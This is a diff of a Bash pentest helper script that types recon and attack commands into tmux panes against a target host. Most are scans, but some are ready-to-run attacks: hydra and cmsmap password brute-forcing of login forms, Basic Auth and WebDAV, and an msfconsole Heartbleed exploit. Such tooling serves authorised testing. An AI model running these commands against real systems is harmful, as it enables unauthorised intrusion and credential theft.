@@ -24,19 +24,35 @@ open_terminal() {
 
 while true
 do
+# XXX
+#    echo ""
+#    echo ""    
+#    echo "Select actions on [$site]:"
+#    echo "1. WEAPONIZATION: install usefull tools for penetration test."
+#    echo "2. FINGERPRINT and EXPLOITATION: Information gathering, service information gathering, quick win, etc."
+#    echo "3. WEB APP SITE FINGERPRINT: site structure, virtual host, etc"
+#    echo "4. WEB APP INFORMATION GATHERING: google dork, CMS, etc"
+#    echo "5. WEB APP AUTHN BYPASS: brute force, command injection, webDAV, etc"
+#    read -p "Enter the number of the desired action (0 to exit): " choice
+
     echo ""
     echo ""    
     echo "Select actions on [$site]:"
-    echo "1. WEAPONIZATION: install usefull tools for penetration test."
-    echo "2. FINGERPRINT and EXPLOITATION: Information gathering, service information gathering, quick win, etc."
-    echo "3. WEB APP SITE FINGERPRINT: site structure, virtual host, etc"
-    echo "4. WEB APP INFORMATION GATHERING: google dork, CMS, etc"
-    echo "5. WEB APP AUTHN BYPASS: brute force, command injection, webDAV, etc"
+    echo "1. Weaponization: install usefull tools for penetration test."
+    echo "2. Information Gathering: information gathering (dmitry, theharvester), service information gathering (nmap) etc."
+    echo "3. WEB Information Gathering: WAF detection, site structure, virtual host, etc"
+    echo "4. Quick Win: duckduckgo, searchsploit, nessus, nikto, etc"
+    echo "5. Service AuthN bypass: ssh, ftp, smtp,  etc (TBD)"
+    echo "6. WEB Service AuthN bypass: brute force, command injection, webDAV, etc"
     read -p "Enter the number of the desired action (0 to exit): " choice
+
+
+
+
 
     case $choice in
         0)
-            echo "Uscita dal programma."
+            echo "Exit from tool."
             break
             ;;
         1)
@@ -45,7 +61,7 @@ do
 ###################### 	>>>>>>>>>>>>>>>>> WEAPONIZATION
 ######################
 ######################
-            open_terminal "bash -c 'echo WEAPONIZATION; sleep 2;"
+#XXX open_terminal "bash -c 'echo WEAPONIZATION; sleep 2;"
 # Parametri
 folderLin="/opt/_lin"
 folderWin="/opt/_win"
@@ -59,7 +75,6 @@ is_installed() {
 	return 1 # Non installato
     fi
 }
-
 
 
 # ===
@@ -460,31 +475,18 @@ sudo chmod 755 *
         2)
 ######################
 ######################
-###################### 	>>>>>>>>>>>>>>>>> EXPLOITATION
+###################### 	>>>>>>>>>>>>>>>>> Information Gathering: information gathering (dmitry, theharvester), service information gathering (nmap) etc."
 ######################
 ######################
-
-
-open_terminal "bash -c 'echo EXPLOITATION; sleep 2;"
-# contiene:
-# - le funzioni comuni
-# - la richiesta dei parametri utente
-# - la creazione delle cartelle di progetto
-#source "common"
-
-# Creazione di una sessione Tmux con attivazione VPN
 tmux new-session -d -s PT -n "any other business"
 tmux send-keys "ip=$ip" Enter
 tmux send-keys "site=$site" Enter
 tmux send-keys "domain=$domain" Enter
 
-# OPEN-VPN
-#tmux new-window -t PT:1 -n 'openVPN'
-#tmux send-keys -t PT:1 "sudo openvpn /home/kali/Desktop/htb/lab_dok72.ovpn" Enter
-
 
 # INFORMATION GATHERING
 cd $folderProjectInfoGathering
+# Dmitry, Theharvester, ping / nmap, nslookup, ecc
 # Layout
 tmux new-window -t PT:1 -n 'Information Gathering (dmitry, theharvester ...)'
 tmux split-window -v -t PT:1.0
@@ -496,7 +498,6 @@ tmux split-window -v -t PT:1.4
 tmux select-pane -t "1.4"
 tmux split-window -h -t "1.4"
 # Esecuzione dei comandi nelle sottofinestre
-# NMAP TCP - UDP
 tmux send-keys -t PT:1.0 "# dmitry" Enter
 tmux send-keys -t PT:1.0 "dmitry -news $domain -o $folderProjectInfoGathering/dmitry.txt"
 tmux send-keys -t PT:1.1 "# theHarvester" Enter
@@ -512,10 +513,11 @@ tmux send-keys -t PT:1.5 "# Try also reverse nslookup with yougetsignal" Enter
 tmux send-keys -t PT:1.5 "nslookup $ip"
 cd $folderProject
 
-# SERVICE INFORMATION GATHERING
-cd $folderProjectServiceInfoGathering
+
+cd $folderProjectInfoGathering
+# nmap
 # Layout
-tmux new-window -t PT:2 -n 'Service Information Gathering (nmap)'
+tmux new-window -t PT:2 -n 'nmap: Service analysis'
 tmux split-window -v -t PT:2.0
 tmux split-window -v -t PT:2.1
 tmux split-window -v -t PT:2.2
@@ -538,55 +540,33 @@ tmux send-keys -t PT:2.5 "# nmap (TCP) WITH firewall evasion" Enter
 tmux send-keys -t PT:2.5 "sudo nmap -sV -sC -O -vv -p- -T5 --script firewall-bypass $ip -Pn -oA out.TCP"
 cd $folderProject
 
-# QUICK WIN
-cd $folderProjectQuickWin
-# Layout
-tmux new-window -t PT:3 -n 'QuickWin'
-tmux split-window -v -t PT:3.0
-tmux split-window -v -t PT:3.1
-tmux split-window -v -t PT:3.2
-tmux split-window -v -t PT:3.3
-# Esecuzione dei comandi nelle sottofinestre
-# FIREFOX
-tmux send-keys -t PT:3.0 "# gogoduck vulnerability scan" Enter
-tmux send-keys -t PT:3.0 "xdg-open \"https://google.com/?q=<servizio>+default+password\" & xdg-open \"https://google.com/?q=<servizio>+default+credentials\" & xdg-open \"https://google.com/?q=<servizio>+vulnerability+poc+github\" & xdg-open \"https://google.com/?q=<servizio>+exploit+poc+github\""
-tmux send-keys -t PT:3.1 "# searchsploit vulnerability scan" Enter
-tmux send-keys -t PT:3.1 "searchsploit \"<servizio>\""
-tmux send-keys -t PT:3.2 "# msfconsole vulnerability scan" Enter
-tmux send-keys -t PT:3.2 "msfupdate; msfconsole -qx \"search type:exploit <servizio>\""
-tmux send-keys -t PT:3.3 "# nessus vulnerability scan" Enter
-tmux send-keys -t PT:3.3 "sudo systemctl start nessusd & xdg-open \"https://127.0.0.1:8834/\""
-
-cd $folderProject
-
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
 ;;
             
             
+
+
+
+
             
             
             
         3)
 ######################
 ######################
-###################### 	>>>>>>>>>>>>>>>>> WEB APP: FINGER-PRINT
+###################### 	>>>>>>>>>>>>>>>>> WEB Information Gathering: WAF detection, site structure, virtual host, etc
 ######################
 ######################
 
-open_terminal "bash -c 'echo WEB APP: site fingerprint; sleep 2;"
+# XXX open_terminal "bash -c 'echo WEB APP: site fingerprint; sleep 2;"
 # Creazione di una sessione Tmux con attivazione VPN
 tmux new-session -d -s PT -n "any other business"
 tmux send-keys "ip=$ip" Enter
 tmux send-keys "site=$site" Enter
 tmux send-keys "domain=$domain" Enter
 
-# OPEN-VPN
-#tmux new-window -t PT:1 -n 'openVPN'
-#tmux send-keys -t PT:1 "sudo openvpn /home/kali/Desktop/htb/lab_dok72.ovpn" Enter
-
-# WEB Site Structure
-cd $folderProjectWebFingerprint
+cd $folderProjectWebInfo
 # Layout
 tmux new-window -t PT:1 -n 'WEB Site Structure'
 tmux split-window -v -t PT:1.0  
@@ -599,9 +579,10 @@ tmux split-window -h -t "1.2"
 tmux select-pane -t "1.5"
 tmux split-window -h -t "1.5"
 # Esecuzione dei comandi nelle sottofinestre
+# WGET standard file
 tmux send-keys -t PT:1.0 "# get common file (robots, sitemap, ...)" Enter
 tmux send-keys -t PT:1.0 "wget ""http://$site/robots.txt"" ""http://$site/sitemap.xml"" ""http://$site/crosssite.xml"" ""http://$site/phpinfo.php"" ""http://$site/index.php"" ""http://$site/index.html"""
-
+# Gobuster, dirsearch
 tmux send-keys -t PT:1.1 "find /usr/share/seclists/ | grep dir | xargs wc -l  | sort -n # search dictionary"
 tmux send-keys -t PT:1.2 "# find site structure" Enter
 tmux send-keys -t PT:1.2 "# Remeber also that:" Enter
@@ -628,13 +609,12 @@ tmux send-keys -t PT:1.6 "# 1. HTTP PUT -> webDav" Enter
 tmux send-keys -t PT:1.6 "# 2. /cgi-bin/file.cgi -> Shellshock" Enter
 tmux send-keys -t PT:1.6 "# 3. nginx con redirect da /asset a /asset/ -> nginx off by side" Enter
 tmux send-keys -t PT:1.6 "dirsearch -u http://$site"
-
 cd $folderProject
 
 
 
 # WEB Virtual Host
-cd $folderProjectWebFingerprint
+cd $folderProjectWebInfo
 # Layout
 tmux new-window -t PT:2 -n 'WEB Virtual Host'
 tmux split-window -v -t PT:2.0
@@ -648,7 +628,7 @@ cd $folderProject
 
 
 # WEB Metodi Attivi
-cd $folderProjectWebFingerprint
+cd $folderProjectWebInfo
 # Layout
 tmux new-window -t PT:3 -n 'WEB Metodi Attivi'
 tmux split-window -v -t PT:3.0
@@ -659,7 +639,7 @@ cd $folderProject
 
 
 # WEB Estensione File
-cd $folderProjectWebFingerprint
+cd $folderProjectWebInfo
 # Layout
 tmux new-window -t PT:4 -n 'WEB Estensione File'
 tmux split-window -v -t PT:4.0
@@ -669,9 +649,8 @@ tmux send-keys -t PT:4.0 "wfuzz -c -w /usr/share/wordlists/dirb/common.txt -w /u
 cd $folderProject
 
 
-
 # WEB API
-cd $folderProjectWebFingerprint
+cd $folderProjectWebInfo
 # Layout
 tmux new-window -t PT:5 -n 'WEB API'
 tmux split-window -v -t PT:5.0
@@ -689,9 +668,8 @@ tmux send-keys -t PT:5.3 "# analyze endPoint with curl " Enter
 tmux send-keys -t PT:5.3 "curl -X POST http://$site/api/v1/user # play with version"
 
 
-
 # Guessing GET / POST Parameter
-cd $folderProjectWebFingerprint
+cd $folderProjectWebInfo
 # Layout
 tmux new-window -t PT:6 -n 'Guessing GET/POST param'
 tmux split-window -v -t PT:6.0
@@ -709,10 +687,8 @@ tmux send-keys -t PT:6.3 "# find a valid value (POST)" Enter
 tmux send-keys -t PT:6.3 "wfuzz -w /usr/share/dirb/wordlists/big.txt --hl 20 -d "name=dok&Param1=FUZZ" http://$site/action.php"
 
 
-
-
 # WEB Site Info
-cd $folderProjectWebFingerprint
+cd $folderProjectWebInfo
 # Layout
 tmux new-window -t PT:7 -n 'WEB Site Info'
 tmux split-window -v -t PT:7.0
@@ -724,9 +700,8 @@ tmux send-keys -t PT:7.1 "# cookie analysis to get information about site framew
 tmux send-keys -t PT:7.1 "curl -s -I http://$site"
 cd $folderProject
 
-
 # WAF Detection
-cd $folderProjectWebFingerprint
+cd $folderProjectWebInfo
 # Layout
 tmux new-window -t PT:8 -n 'WAF Detection'
 tmux split-window -v -t PT:8.0
@@ -736,9 +711,8 @@ tmux send-keys -t PT:8.0 "sudo whatwaf -u http://$site"
 cd $folderProject
 
 
-
 # Site crowler
-cd $folderProjectWebFingerprint
+cd $folderProjectWebInfo
 # Layout
 tmux new-window -t PT:9 -n 'Site Crowler'
 tmux split-window -v -t PT:9.0
@@ -751,297 +725,332 @@ tmux send-keys -t PT:9.1 "echo https://$site | sudo docker run --rm -i hakluke/h
 cd $folderProject
 
 
-# Attivazione della modalità interattiva
-tmux -2 attach-session -t PT
-;;
-
-
-
-
-
-
-
-
-
-       4)
-######################
-######################
-###################### 	>>>>>>>>>>>>>>>>> WEB APP: INFORMATION-GATHERING
-######################
-######################
-open_terminal "bash -c 'echo WEB APP: INformation GAthering; sleep 2;"
-# Creazione di una sessione Tmux con attivazione VPN
-tmux new-session -d -s PT -n "any other business"
-tmux send-keys "ip=$ip" Enter
-tmux send-keys "site=$site" Enter
-tmux send-keys "domain=$domain" Enter
-
-# OPEN-VPN
-#tmux new-window -t PT:1 -n 'openVPN'
-#tmux send-keys -t PT:1 "sudo openvpn /home/kali/Desktop/htb/lab_dok72.ovpn" Enter
-
 # WEB nmap whois
 cd $folderProjectWebInfo
 # Layout
-tmux new-window -t PT:1 -n 'WEB nmap whois'
-tmux split-window -v -t PT:1.0  
-tmux split-window -v -t PT:1.1 
-tmux split-window -v -t PT:1.2 
-tmux split-window -v -t PT:1.3 
-tmux select-pane -t "1.2"
-tmux split-window -h -t "1.2"
-tmux split-window -h -t "1.2"
-tmux select-pane -t "1.5"
-tmux split-window -h -t "1.5"
+tmux new-window -t PT:10 -n 'WEB nmap whois'
+tmux split-window -v -t PT:10.0  
+tmux split-window -v -t PT:10.1 
+tmux split-window -v -t PT:10.2 
+tmux split-window -v -t PT:10.3 
+tmux select-pane -t "10.2"
+tmux split-window -h -t "10.2"
+tmux split-window -h -t "10.2"
+tmux select-pane -t "10.5"
+tmux split-window -h -t "10.5"
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:1.0 "# nmap on 80 port" Enter
-tmux send-keys -t PT:1.0 "nmap -Pn -sC -sV -T4 -p 80 $ip -oA out.80.infoGathering"
-tmux send-keys -t PT:1.1 "# nmap pm 80 port with specific script" Enter
-tmux send-keys -t PT:1.1 "nmap -Pn -vv -p 80 --script=http-* $ip -oA out.80.InfoGathering-script"
-tmux send-keys -t PT:1.2 "# GET normal request" Enter
-tmux send-keys -t PT:1.2 "echo -e \"GET / HTTP/1.0\n\" | nc -nv $ip 80"
-tmux send-keys -t PT:1.3 "# GET error request" Enter
-tmux send-keys -t PT:1.3 "echo -e \"GET / HTTP/3.0\n\" | nc -nv $ip 80"
-tmux send-keys -t PT:1.4 "# GET error request" Enter
-tmux send-keys -t PT:1.4 "echo -e \"GET / JUNK/1.0\n\" | nc -nv $ip 80"
-tmux send-keys -t PT:1.5 "# whois domain" Enter
-tmux send-keys -t PT:1.5 "whois $domain"
-tmux send-keys -t PT:1.6 "# whois IP" Enter
-tmux send-keys -t PT:1.6 "whois $ip"
+tmux send-keys -t PT:10.0 "# nmap on 80 port" Enter
+tmux send-keys -t PT:10.0 "nmap -Pn -sC -sV -T4 -p 80 $ip -oA out.80.infoGathering"
+tmux send-keys -t PT:10.1 "# nmap pm 80 port with specific script" Enter
+tmux send-keys -t PT:10.1 "nmap -Pn -vv -p 80 --script=http-* $ip -oA out.80.InfoGathering-script"
+tmux send-keys -t PT:10.2 "# GET normal request" Enter
+tmux send-keys -t PT:10.2 "echo -e \"GET / HTTP/1.0\n\" | nc -nv $ip 80"
+tmux send-keys -t PT:10.3 "# GET error request" Enter
+tmux send-keys -t PT:10.3 "echo -e \"GET / HTTP/3.0\n\" | nc -nv $ip 80"
+tmux send-keys -t PT:10.4 "# GET error request" Enter
+tmux send-keys -t PT:10.4 "echo -e \"GET / JUNK/1.0\n\" | nc -nv $ip 80"
+tmux send-keys -t PT:10.5 "# whois domain" Enter
+tmux send-keys -t PT:10.5 "whois $domain"
+tmux send-keys -t PT:10.6 "# whois IP" Enter
+tmux send-keys -t PT:10.6 "whois $ip"
 cd $folderProject
-
 
 
 # WEB Analisi del certificato HTTPS
 cd $folderProjectWebInfo
 # Layout
-tmux new-window -t PT:2 -n 'WEB Certificato HTTPS'
-tmux split-window -v -t PT:2.0
-tmux split-window -v -t PT:2.1
+tmux new-window -t PT:11 -n 'WEB Certificato HTTPS'
+tmux split-window -v -t PT:11.0
+tmux split-window -v -t PT:11.1
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:2.0 "# SSL analysis with sslscan" Enter
-tmux send-keys -t PT:2.0 "sslscan $ip"
-tmux send-keys -t PT:2.1 "# certificate analysis" Enter
-tmux send-keys -t PT:2.1 "openssl s_client -connect $site:443 </dev/null 2>/dev/null | openssl x509 -out $site.crt; echo \"Certificato scaricato: $site.crt\" # get certificate info"
-cd $folderProject
-
-
-# WEB google dork
-cd $folderProjectWebInfo
-# Layout
-tmux new-window -t PT:3 -n 'WEB google dork'
-tmux split-window -v -t PT:3.0
-# Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:3.0 "domain=$domain" Enter
-tmux send-keys -t PT:3.0 "ip=$ip" Enter
-tmux send-keys -t PT:3.0 "site=$site" Enter
-tmux send-keys -t PT:3.0 "# google dork" Enter
-#tmux send-keys -t PT:3.0 "xdg-open \"https://google.com/?q=site:$domain filetype:php\" & xdg-open \"https://google.com/?q=site:$domain intitle:\"\"index of\"\" \"\"parent directory\"\"\" & xdg-open \"https://google.com/?q=site:$domain -site:www.$domain\" & xdg-open \"https://google.com/?q=site:pastebin.com $domain\" & xdg-open \"https://google.com/?q=site:github.com $domain\" & xdg-open \"https://google.com/?q=site:pastebin.com intext:$domain\" # google dork"
-tmux send-keys -t PT:3.0 "grep -v '^#' $folderProjectEngine/google-dork.txt | sed 's/\$domain/\\$domain/g' | xargs -I {} xdg-open \"https://google.com/?q=\"{}"
-
+tmux send-keys -t PT:11.0 "# SSL analysis with sslscan" Enter
+tmux send-keys -t PT:11.0 "sslscan $ip"
+tmux send-keys -t PT:11.1 "# certificate analysis" Enter
+tmux send-keys -t PT:11.1 "openssl s_client -connect $site:443 </dev/null 2>/dev/null | openssl x509 -out $site.crt; echo \"Certificato scaricato: $site.crt\" # get certificate info"
 cd $folderProject
 
 
 # WEB Information from web
 cd $folderProjectWebInfo
 # Layout
-tmux new-window -t PT:4 -n 'WEB Information from web'
-tmux split-window -v -t PT:4.0
+tmux new-window -t PT:12 -n 'WEB Information from web'
+tmux split-window -v -t PT:12.0
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:4.0 "# get info from search site" Enter
-tmux send-keys -t PT:4.0 "xdg-open \"https://securityheaders.com/\" & xdg-open \"https://www.ssllabs.com/ssltest/\" & xdg-open \"https://www.social-searcher.com/\""
+tmux send-keys -t PT:12.0 "# get info from search site" Enter
+tmux send-keys -t PT:12.0 "xdg-open \"https://securityheaders.com/\" & xdg-open \"https://www.ssllabs.com/ssltest/\" & xdg-open \"https://www.social-searcher.com/\""
 cd $folderProject
 
 
 # openssl_heartbleed
 cd $folderProjectWebInfo
 # Layout
-tmux new-window -t PT:5 -n 'openssl_heartbleed'
-tmux split-window -v -t PT:5.0
-tmux split-window -v -t PT:5.1
+tmux new-window -t PT:13 -n 'openssl_heartbleed'
+tmux split-window -v -t PT:13.0
+tmux split-window -v -t PT:13.1
+tmux split-window -v -t PT:13.2
+tmux split-window -v -t PT:13.3
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:5.0 "# verify heartbleed with nmap" Enter
-tmux send-keys -t PT:5.0 "nmap -sV --script=ssl-heartbleed $ip"
-tmux send-keys -t PT:5.1 "# attack target by means of heartbleed" Enter
-tmux send-keys -t PT:5.1 "msfconsole -q -x \"use auxiliary/scanner/ssl/openssl_heartbleed;set RHOSTS $ip;set RPORT 443;set VERBOSE true;exploit;\""
+tmux send-keys -t PT:13.0 "# verify heartbleed with nmap" Enter
+tmux send-keys -t PT:13.0 "nmap -p 443 -sV --script=ssl-heartbleed $ip"
+tmux send-keys -t PT:13.0 "# verify heartbleed with sslyze" Enter
+tmux send-keys -t PT:13.0 "sslyze --heartbleed $ip"
+tmux send-keys -t PT:13.0 "# verify heartbleed with sslscan" Enter
+tmux send-keys -t PT:13.0 "sslscan $ip"
+tmux send-keys -t PT:13.1 "# attack target by means of heartbleed" Enter
+tmux send-keys -t PT:13.1 "msfconsole -q -x \"use auxiliary/scanner/ssl/openssl_heartbleed;set RHOSTS $ip;set RPORT 443;set VERBOSE true;exploit;\""
 cd $folderProject
-
 
 
 # CMS: Joomla, wordpress, drupal & co
 cd $folderProjectWebInfo
 # Layout
-tmux new-window -t PT:6 -n 'CMS: Joomla, wordpress, drupal & co'
-tmux split-window -v -t PT:6.0
-tmux split-window -v -t PT:6.1
-tmux split-window -v -t PT:6.2
-tmux split-window -v -t PT:6.3
-tmux select-pane -t "6.0"
-tmux split-window -h -t "6.0"
-tmux split-window -h -t "6.0"
-tmux select-pane -t "6.3"
-tmux split-window -h -t "6.3"
-tmux split-window -h -t "6.3"
-tmux split-window -h -t "6.3"
-tmux select-pane -t "6.7"
-tmux split-window -h -t "6.7"
-tmux split-window -h -t "6.7"
-tmux split-window -h -t "6.7"
-tmux select-pane -t "6.11"
-tmux split-window -h -t "6.11"
-
+tmux new-window -t PT:14 -n 'CMS: Joomla, wordpress, drupal & co'
+tmux split-window -v -t PT:14.0
+tmux split-window -v -t PT:14.1
+tmux split-window -v -t PT:14.2
+tmux split-window -v -t PT:14.3
+tmux select-pane -t "14.0"
+tmux split-window -h -t "14.0"
+tmux split-window -h -t "14.0"
+tmux select-pane -t "14.3"
+tmux split-window -h -t "14.3"
+tmux split-window -h -t "14.3"
+tmux split-window -h -t "14.3"
+tmux select-pane -t "14.7"
+tmux split-window -h -t "14.7"
+tmux split-window -h -t "14.7"
+tmux split-window -h -t "14.7"
+tmux select-pane -t "14.11"
+tmux split-window -h -t "14.11"
 # Esecuzione dei comandi nelle sottofinestre
-tmux send-keys -t PT:6.0 "# update (if necessary) scan tools" Enter
-tmux send-keys -t PT:6.0 "wpscan --update; joomscan update; cmsmap http://$site --update"
-tmux send-keys -t PT:6.1 "# whatweb analysis of target site" Enter
-tmux send-keys -t PT:6.1 "whatweb -a 3 http://$site"
-tmux send-keys -t PT:6.2 "# cmsmap to scan target" Enter
-tmux send-keys -t PT:6.2 "cmsmap http://$site -F"
-tmux send-keys -t PT:6.3 "# wordpress scan with nmap analysis" Enter
-tmux send-keys -t PT:6.3 "nmap -Pn -vv -p 80 --script=http-wordpress* $ip -oA out.wp"
-tmux send-keys -t PT:6.4 "# wpscan with principal plugins and themes" Enter
-tmux send-keys -t PT:6.4 "wpscan --url http://$site --enumerate p,t,cb,dbe,u --plugins-detection aggressive --api-token $wptoken -o wpscan.txt [--disable-tls-checks]"
-tmux send-keys -t PT:6.5 "# wpscan with all plugins and themes" Enter
-tmux send-keys -t PT:6.5 "wpscan --url http://$site --enumerate ap,at,cb,dbe,u --plugins-detection aggressive --api-token $wptoken  -o wpscanALL.txt[--disable-tls-checks]"
-tmux send-keys -t PT:6.6 "# cmsmap bruteforceCMS" Enter
-tmux send-keys -t PT:6.6 "sudo cmsmap https://$site -u $pathFile_users -p $pathFile_passwords -f W"
-tmux send-keys -t PT:6.7 "# joomscam target site" Enter
-tmux send-keys -t PT:6.7 "joomscan -u http://$site"
-tmux send-keys -t PT:6.8 "# msfconsole to test joomla target site" Enter
-tmux send-keys -t PT:6.8 "msfconsole -q -x \"use auxiliary/scanner/http/joomla_plugins;set RHOSTS $ip;set THREADS 5;run\""
-tmux send-keys -t PT:6.9 "# juumla to test joomla target site" Enter
-tmux send-keys -t PT:6.9 "python /opt/juumla/main.py -u http://$site"
-tmux send-keys -t PT:6.10 "# cmsmap bruteforce" Enter
-tmux send-keys -t PT:6.10 "sudo cmsmap https://$site -u ../users.txt -p ../passwords.txt -f J"
-tmux send-keys -t PT:6.11 "# scan drupal site with droopescan" Enter
-tmux send-keys -t PT:6.11 "droopescan scan drupal -u http://$site -t 32"
+tmux send-keys -t PT:14.0 "# update (if necessary) scan tools" Enter
+tmux send-keys -t PT:14.0 "wpscan --update; joomscan update; cmsmap http://$site --update"
+tmux send-keys -t PT:14.1 "# whatweb analysis of target site" Enter
+tmux send-keys -t PT:14.1 "whatweb -a 3 http://$site"
+tmux send-keys -t PT:14.2 "# cmsmap to scan target" Enter
+tmux send-keys -t PT:14.2 "cmsmap http://$site -F"
+tmux send-keys -t PT:14.3 "# wordpress scan with nmap analysis" Enter
+tmux send-keys -t PT:14.3 "nmap -Pn -vv -p 80 --script=http-wordpress* $ip -oA out.wp"
+tmux send-keys -t PT:14.4 "# wpscan with principal plugins and themes" Enter
+tmux send-keys -t PT:14.4 "wpscan --url http://$site --enumerate p,t,cb,dbe,u --plugins-detection aggressive --api-token $wptoken -o wpscan.txt [--disable-tls-checks]"
+tmux send-keys -t PT:14.5 "# wpscan with all plugins and themes" Enter
+tmux send-keys -t PT:14.5 "wpscan --url http://$site --enumerate ap,at,cb,dbe,u --plugins-detection aggressive --api-token $wptoken  -o wpscanALL.txt[--disable-tls-checks]"
+tmux send-keys -t PT:14.6 "# cmsmap bruteforceCMS" Enter
+tmux send-keys -t PT:14.6 "sudo cmsmap https://$site -u $pathFile_users -p $pathFile_passwords -f W"
+tmux send-keys -t PT:14.7 "# joomscam target site" Enter
+tmux send-keys -t PT:14.7 "joomscan -u http://$site"
+tmux send-keys -t PT:14.8 "# msfconsole to test joomla target site" Enter
+tmux send-keys -t PT:14.8 "msfconsole -q -x \"use auxiliary/scanner/http/joomla_plugins;set RHOSTS $ip;set THREADS 5;run\""
+tmux send-keys -t PT:14.9 "# juumla to test joomla target site" Enter
+tmux send-keys -t PT:14.9 "python /opt/juumla/main.py -u http://$site"
+tmux send-keys -t PT:14.10 "# cmsmap bruteforce" Enter
+tmux send-keys -t PT:14.10 "sudo cmsmap https://$site -u ../users.txt -p ../passwords.txt -f J"
+tmux send-keys -t PT:14.11 "# scan drupal site with droopescan" Enter
+tmux send-keys -t PT:14.11 "droopescan scan drupal -u http://$site -t 32"
 cd $folderProject
-
 
 
 # Attivazione della modalità interattiva
 tmux -2 attach-session -t PT
-
-            
 ;;
+
+
+
+
+
+
+
+
+
+
+        4)
+######################
+######################
+###################### 	>>>>>>>>>>>>>>>>> Quick Win: duckduckgo, searchsploit, nessus, nikto, etc
+######################
+######################
+
+
+# XXX open_terminal "bash -c 'echo EXPLOITATION; sleep 2;"
+# contiene:
+# - le funzioni comuni
+# - la richiesta dei parametri utente
+# - la creazione delle cartelle di progetto
+#source "common"
+# Creazione di una sessione Tmux con attivazione VPN
+
+tmux new-session -d -s PT -n "any other business"
+tmux send-keys "ip=$ip" Enter
+tmux send-keys "site=$site" Enter
+tmux send-keys "domain=$domain" Enter
+
+# duckduckgo, msfconsole
+cd $folderProjectQuickWin
+# Layout
+tmux new-window -t PT:1 -n 'duckduckgo, searchSploit'
+tmux split-window -v -t PT:1.0
+tmux split-window -v -t PT:1.1
+tmux split-window -v -t PT:1.2
+tmux split-window -v -t PT:1.3
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:1.0 "# duckduckgo vulnerability scan" Enter
+tmux send-keys -t PT:1.0 "xdg-open \"https://duckduckgo.com/?q=<servizio>+default+password\" & xdg-open \"https://duckduckgo.com/?q=<servizio>+default+credentials\" & xdg-open \"https://duckduckgo.com/?q=<servizio>+vulnerability+poc+github\" & xdg-open \"https://duckduckgo.com/?q=<servizio>+exploit+poc+github\""
+tmux send-keys -t PT:1.1 "# searchsploit vulnerability scan" Enter
+tmux send-keys -t PT:1.1 "searchsploit \"<servizio>\""
+tmux send-keys -t PT:1.2 "# msfconsole vulnerability scan" Enter
+tmux send-keys -t PT:1.2 "msfupdate; msfconsole -qx \"search type:exploit <servizio>\""
+cd $folderProject
+
+
+# WEB google dork
+cd $folderProjectQuickWin
+# Layout
+tmux new-window -t PT:2 -n 'google dork'
+tmux split-window -v -t PT:2.0
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:2.0 "domain=$domain" Enter
+tmux send-keys -t PT:2.0 "ip=$ip" Enter
+tmux send-keys -t PT:2.0 "site=$site" Enter
+tmux send-keys -t PT:2.0 "# google dork" Enter
+tmux send-keys -t PT:2.0 "grep -v '^#' $folderProjectEngine/google-dork.txt | sed 's/\$domain/\\$domain/g' | xargs -I {} xdg-open \"https://google.com/?q=\"{}"
+cd $folderProject
+
+
+# Nessus
+cd $folderProjectQuickWin
+# Layout
+tmux new-window -t PT:3 -n 'Nessus'
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:3.0 "# nessus vulnerability scan" Enter
+tmux send-keys -t PT:3.0 "sudo systemctl start nessusd && sleep 2 && xdg-open \"https://127.0.0.1:8834/\""
+cd $folderProject
+
+
+# Nikto
+cd $folderProjectQuickWin
+# Layout
+tmux new-window -t PT:4 -n 'Nikto'
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:4.0 "# Nikto vulnerability scan" Enter
+tmux send-keys -t PT:4.0 "sudo nikto -h http://$site"
+cd $folderProject
+
+
+# WEB Bruteforce AuthN
+cd $folderProjectQuickWin
+# Layout
+tmux new-window -t PT:5 -n 'WEB Bruteforce AuthN'
+tmux split-window -v -t PT:5.0
+tmux split-window -v -t PT:5.1
+tmux split-window -v -t PT:5.2
+tmux select-pane -t "5.1"
+tmux split-window -h -t "5.1"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:5.0 "# find valid dictionary for bruteforce" Enter
+tmux send-keys -t PT:5.0 "find /usr/share/seclists/ | grep user | xargs wc -l | sort -n"
+tmux send-keys -t PT:5.1 "# bruteforce POST authN" Enter
+tmux send-keys -t PT:5.1 "hydra $ip http-form-post \"/form/login.php:user=^USER^&pass=^PASS^:INVALID LOGIN\" -l $pathFile_users -P $pathFile_passwords -vV -f"
+tmux send-keys -t PT:5.2 "# bruteforce POST authN with BurpSuite saved request" Enter
+tmux send-keys -t PT:5.2 "ffuf -request BurpSavedRequest.txt -request-proto http -w $pathFile_users:FUZZUSR,$pathFile_passwords:FUZZPW $ip"
+tmux send-keys -t PT:5.3 "# bruteforce BasicAuth authN" Enter
+tmux send-keys -t PT:5.3 "hydra -L $pathFile_users -P $pathFile_passwords -f $ip http-get / # Bruteforce BasicAuth authN"
+tmux send-keys -t PT:5.4 "# bruteforce CMS" Enter
+tmux send-keys -t PT:5.4 "sudo cmsmap https://$site -u $pathFile_users -p $pathFile_passwords -f W"
+cd $folderProject
+
+
+# WEB DAV
+cd $folderProjectQucikWin
+# Layout
+tmux new-window -t PT:6 -n 'WEB DAV'
+tmux split-window -v -t PT:6.0
+tmux split-window -v -t PT:6.1
+tmux split-window -v -t PT:6.2
+tmux split-window -v -t PT:6.3
+tmux select-pane -t "6.3"
+tmux split-window -h -t "6.3"
+tmux split-window -h -t "6.3"
+# Esecuzione dei comandi nelle sottofinestre
+tmux send-keys -t PT:6.0 "# Bruteforce attack to get Target Site Folders" Enter
+tmux send-keys -t PT:6.0 "gobuster dir -u http://$site -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
+tmux send-keys -t PT:6.1 "# Bruteforce attack to get credentials to specific folder" Enter
+tmux send-keys -t PT:6.1 "hydra -L $pathFile_users -P $pathFile_passwords $site http-get /"
+tmux send-keys -t PT:6.2 "# testing site folders (by means of dictionary) to find webDav permission. User and Passwprd should be provided even if they are not required" Enter
